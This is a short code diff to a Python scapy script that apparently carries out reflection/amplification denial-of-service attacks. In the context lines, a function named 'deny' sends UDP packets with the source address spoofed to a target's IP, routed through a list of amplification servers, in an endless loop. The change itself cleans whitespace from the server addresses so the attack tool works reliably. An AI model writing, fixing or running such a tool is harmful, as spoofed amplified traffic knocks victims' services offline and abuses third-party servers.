@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 from scapy.all import *
-import sys, argparse, urllib2, threading, time, urllib2, random
+import sys, argparse, urllib2, threading, time, urllib2, re
 
 print("""
 
@@ -26,6 +26,7 @@ def deny(data, port):
   global target
   amp = servers[current] 
   current = current + 1
+  amp = re.sub("^\s+|\n|\r|\s+$", '', amp)
   packet = IP(dst=amp,src=target)/UDP(sport=80, dport=port)/Raw(load=data)
   send(packet, verbose=0, loop=1)
 
